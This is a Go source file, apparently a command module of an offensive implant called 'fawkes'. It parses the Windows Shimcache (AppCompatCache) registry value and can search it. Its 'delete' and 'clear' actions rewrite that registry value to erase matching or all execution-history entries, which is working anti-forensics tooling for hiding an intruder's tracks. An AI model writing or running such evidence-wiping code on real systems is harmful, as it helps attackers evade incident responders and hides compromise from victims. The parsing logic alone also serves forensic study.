//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// AmcacheCommand implements Shimcache/Amcache forensic artifact management
type AmcacheCommand struct{}

func (c *AmcacheCommand) Name() string {
	return "amcache"
}

func (c *AmcacheCommand) Description() string {
	return "Query and clean Windows Shimcache (AppCompatCache) execution history"
}

type amcacheParams struct {
	Action string `json:"action"`
	Name   string `json:"name"`
	Count  int    `json:"count"`
}

// Shimcache entry parsed from AppCompatCache registry value
type shimcacheEntry struct {
	Path         string
	LastModified time.Time
	DataSize     uint32
	DataOffset   int
	EntrySize    int
}

// amcacheOutputEntry is the JSON output format for browser script rendering
type amcacheOutputEntry struct {
	Index        int    `json:"index"`
	LastModified string `json:"last_modified"`
	Path         string `json:"path"`
}

// Windows 10/11 AppCompatCache header
// Signature: "10ts" (0x30747331)
// After the 4-byte signature comes a 4-byte unknown field, then entries
const shimcacheWin10Sig = 0x73743031 // "10ts" as little-endian uint32

func (c *AmcacheCommand) Execute(task structs.Task) structs.CommandResult {
	var params amcacheParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.Action == "" {
		params.Action = "query"
	}
	if params.Count == 0 {
		params.Count = 50
	}

	switch params.Action {
	case "query":
		return amcacheQuery(params)
	case "search":
		return amcacheSearch(params)
	case "delete":
		return amcacheDelete(params)
	case "clear":
		return amcacheClear()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use query, search, delete, or clear)", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// readShimcacheRaw reads the raw AppCompatCache registry value
func readShimcacheRaw() ([]byte, error) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`,
		registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("open registry key: %v", err)
	}
	defer key.Close()

	val, _, err := key.GetBinaryValue("AppCompatCache")
	if err != nil {
		return nil, fmt.Errorf("read AppCompatCache value: %v", err)
	}
	return val, nil
}

// parseShimcacheWin10 parses Windows 10/11 Shimcache format
// Header: first 4 bytes = header size (0x34 = 52 on Win10/11)
// Entries start at offset indicated by header size
// Each entry: sig(4) + unknown(4) + data_size(4) + data(data_size bytes)
// Inside data: path_len(2) + path(path_len bytes UTF-16LE) + FILETIME(8) + remaining
func parseShimcacheWin10(data []byte) ([]shimcacheEntry, error) {
	if len(data) < 52 {
		return nil, fmt.Errorf("data too small: %d bytes", len(data))
	}

	// Header size is in the first 4 bytes
	headerSize := binary.LittleEndian.Uint32(data[0:4])
	if headerSize < 48 || headerSize > 128 {
		return nil, fmt.Errorf("unexpected header size: %d", headerSize)
	}

	var entries []shimcacheEntry
	offset := int(headerSize) // Skip header

	for offset+12 < len(data) {
		entrySig := binary.LittleEndian.Uint32(data[offset : offset+4])
		if entrySig != shimcacheWin10Sig {
			break
		}

		entryStart := offset

		// Entry header: sig(4) + unknown(4) + data_size(4)
		dataSize := int(binary.LittleEndian.Uint32(data[offset+8 : offset+12]))
		dataStart := offset + 12
		nextEntry := dataStart + dataSize

		if nextEntry > len(data) {
			break
		}

		// Parse data block: path_len(2) + path + FILETIME(8)
		var path string
		var lastMod time.Time

		if dataStart+2 <= len(data) {
			pathLen := int(binary.LittleEndian.Uint16(data[dataStart : dataStart+2]))
			pathStart := dataStart + 2

			if pathStart+pathLen <= len(data) {
				path = decodeUTF16LEShim(data[pathStart : pathStart+pathLen])

				// FILETIME follows path
				ftStart := pathStart + pathLen
				if ftStart+8 <= len(data) {
					ft := binary.LittleEndian.Uint64(data[ftStart : ftStart+8])
					if ft > 0 {
						lastMod = filetimeToTime(int64(ft))
					}
				}
			}
		}

		entries = append(entries, shimcacheEntry{
			Path:         path,
			LastModified: lastMod,
			DataSize:     uint32(dataSize),
			DataOffset:   entryStart,
			EntrySize:    nextEntry - entryStart,
		})

		offset = nextEntry
	}

	return entries, nil
}

// parseShimcacheWin8 parses Windows 8/8.1 Shimcache format
// Format: 4-byte signature (0x80) + entries with length-prefixed paths
func parseShimcacheWin8(data []byte) ([]shimcacheEntry, error) {
	if len(data) < 128 {
		return nil, fmt.Errorf("data too small: %d bytes", len(data))
	}

	var entries []shimcacheEntry
	offset := 128 // Skip header

	for offset < len(data)-12 {
		if offset+4 > len(data) {
			break
		}

		// Path length in characters (UTF-16)
		pathLenChars := binary.LittleEndian.Uint32(data[offset : offset+4])
		offset += 4

		pathLenBytes := int(pathLenChars * 2)
		if pathLenBytes <= 0 || pathLenBytes > 2048 || offset+pathLenBytes > len(data) {
			break
		}

		path := decodeUTF16LEShim(data[offset : offset+pathLenBytes])
		offset += pathLenBytes

		// Last modified FILETIME
		var lastMod time.Time
		if offset+8 <= len(data) {
			ft := binary.LittleEndian.Uint64(data[offset : offset+8])
			if ft > 0 {
				lastMod = filetimeToTime(int64(ft))
			}
			offset += 8
		}

		// Data size + data
		if offset+4 > len(data) {
			break
		}
		dataSize := binary.LittleEndian.Uint32(data[offset : offset+4])
		offset += 4
		offset += int(dataSize)

		entries = append(entries, shimcacheEntry{
			Path:         path,
			LastModified: lastMod,
			DataSize:     dataSize,
		})
	}

	return entries, nil
}

// parseShimcache auto-detects format and parses
func parseShimcache(data []byte) ([]shimcacheEntry, string, error) {
	if len(data) < 4 {
		return nil, "", fmt.Errorf("data too small")
	}

	headerVal := binary.LittleEndian.Uint32(data[0:4])

	// Windows 10/11: header starts with header size (typically 0x34 = 52)
	// Check if entries at offset headerVal start with "10ts" signature
	if headerVal >= 48 && headerVal <= 128 && int(headerVal)+4 <= len(data) {
		entrySig := binary.LittleEndian.Uint32(data[headerVal : headerVal+4])
		if entrySig == shimcacheWin10Sig {
			entries, err := parseShimcacheWin10(data)
			return entries, "Windows 10/11", err
		}
	}

	// Windows 8/8.1: header starts with 0x80
	if headerVal == 0x80 {
		entries, err := parseShimcacheWin8(data)
		return entries, "Windows 8/8.1", err
	}

	// Fallback: try Windows 10 format
	entries, err := parseShimcacheWin10(data)
	if err == nil && len(entries) > 0 {
		return entries, "Windows 10/11 (variant)", nil
	}

	return nil, "", fmt.Errorf("unsupported Shimcache format (header: 0x%08X, size: %d bytes)", headerVal, len(data))
}

func amcacheQuery(params amcacheParams) structs.CommandResult {
	data, err := readShimcacheRaw()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading Shimcache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	entries, _, err := parseShimcache(data)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error parsing Shimcache: %v\nRaw data size: %d bytes, first 4 bytes: 0x%08X",
				err, len(data), binary.LittleEndian.Uint32(data[0:4])),
			Status:    "error",
			Completed: true,
		}
	}

	count := params.Count
	if count > len(entries) {
		count = len(entries)
	}

	output := make([]amcacheOutputEntry, 0, count)
	for i := 0; i < count; i++ {
		e := entries[i]
		ts := ""
		if !e.LastModified.IsZero() {
			ts = e.LastModified.Format("2006-01-02 15:04:05")
		}
		output = append(output, amcacheOutputEntry{
			Index:        i + 1,
			LastModified: ts,
			Path:         e.Path,
		})
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling output: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    string(jsonBytes),
		Status:    "success",
		Completed: true,
	}
}

func amcacheSearch(params amcacheParams) structs.CommandResult {
	if params.Name == "" {
		return structs.CommandResult{
			Output:    "Error: -name parameter required for search",
			Status:    "error",
			Completed: true,
		}
	}

	data, err := readShimcacheRaw()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading Shimcache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	entries, _, err := parseShimcache(data)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing Shimcache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	searchLower := strings.ToLower(params.Name)
	var output []amcacheOutputEntry

	for i, e := range entries {
		if strings.Contains(strings.ToLower(e.Path), searchLower) {
			ts := ""
			if !e.LastModified.IsZero() {
				ts = e.LastModified.Format("2006-01-02 15:04:05")
			}
			output = append(output, amcacheOutputEntry{
				Index:        i + 1,
				LastModified: ts,
				Path:         e.Path,
			})
		}
	}

	if output == nil {
		output = []amcacheOutputEntry{}
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling output: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    string(jsonBytes),
		Status:    "success",
		Completed: true,
	}
}

// amcacheDelete removes matching entries from the Shimcache by rewriting the registry value
func amcacheDelete(params amcacheParams) structs.CommandResult {
	if params.Name == "" {
		return structs.CommandResult{
			Output:    "Error: -name parameter required for delete",
			Status:    "error",
			Completed: true,
		}
	}

	data, err := readShimcacheRaw()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading Shimcache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Only support Win10/11 format for deletion
	headerSize := binary.LittleEndian.Uint32(data[0:4])
	if headerSize < 48 || headerSize > 128 || int(headerSize)+4 > len(data) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Delete only supported for Windows 10/11 format (header: 0x%08X)", headerSize),
			Status:    "error",
			Completed: true,
		}
	}
	entrySig := binary.LittleEndian.Uint32(data[headerSize : headerSize+4])
	if entrySig != shimcacheWin10Sig {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Delete only supported for Windows 10/11 format (entry sig: 0x%08X)", entrySig),
			Status:    "error",
			Completed: true,
		}
	}

	entries, err := parseShimcacheWin10(data)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing Shimcache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Find entries to keep (exclude matching ones)
	searchLower := strings.ToLower(params.Name)
	var keepEntries []shimcacheEntry
	removed := 0

	for _, e := range entries {
		if strings.Contains(strings.ToLower(e.Path), searchLower) {
			removed++
		} else {
			keepEntries = append(keepEntries, e)
		}
	}

	if removed == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No entries matching \"%s\" found in Shimcache", params.Name),
			Status:    "success",
			Completed: true,
		}
	}

	// Rebuild the Shimcache binary data with matching entries removed
	newData := rebuildShimcacheWin10(data[:headerSize], keepEntries, data)
	if newData == nil {
		return structs.CommandResult{
			Output:    "Error rebuilding Shimcache data",
			Status:    "error",
			Completed: true,
		}
	}

	// Write back
	if err := writeShimcache(newData); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing Shimcache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed %d entries matching \"%s\" from Shimcache (%d remaining)", removed, params.Name, len(keepEntries)),
		Status:    "success",
		Completed: true,
	}
}

// amcacheClear removes all Shimcache entries
func amcacheClear() structs.CommandResult {
	data, err := readShimcacheRaw()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading Shimcache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(data) < 52 {
		return structs.CommandResult{
			Output:    "Shimcache data too small",
			Status:    "error",
			Completed: true,
		}
	}

	entries, _, _ := parseShimcache(data)
	totalEntries := len(entries)

	// Write just the header (no entries) — header size from first 4 bytes
	headerSize := int(binary.LittleEndian.Uint32(data[0:4]))
	if headerSize < 48 || headerSize > 128 || headerSize > len(data) {
		headerSize = 52 // Default Win10/11 header size
	}
	header := make([]byte, headerSize)
	copy(header, data[:headerSize])

	if err := writeShimcache(header); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error clearing Shimcache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Cleared Shimcache — removed %d entries", totalEntries),
		Status:    "success",
		Completed: true,
	}
}

// rebuildShimcacheWin10 rebuilds the binary Shimcache data keeping only specified entries
func rebuildShimcacheWin10(header []byte, keepEntries []shimcacheEntry, originalData []byte) []byte {
	// Start with the header
	result := make([]byte, len(header))
	copy(result, header)

	// Append each kept entry's raw bytes from the original data
	for _, e := range keepEntries {
		if e.DataOffset+e.EntrySize > len(originalData) {
			return nil
		}
		result = append(result, originalData[e.DataOffset:e.DataOffset+e.EntrySize]...)
	}

	return result
}

// writeShimcache writes new Shimcache data to the registry
func writeShimcache(data []byte) error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`,
		registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("open key for write: %v", err)
	}
	defer key.Close()

	if err := key.SetBinaryValue("AppCompatCache", data); err != nil {
		return fmt.Errorf("write value: %v", err)
	}
	return nil
}

// decodeUTF16LEShim moved to command_helpers.go
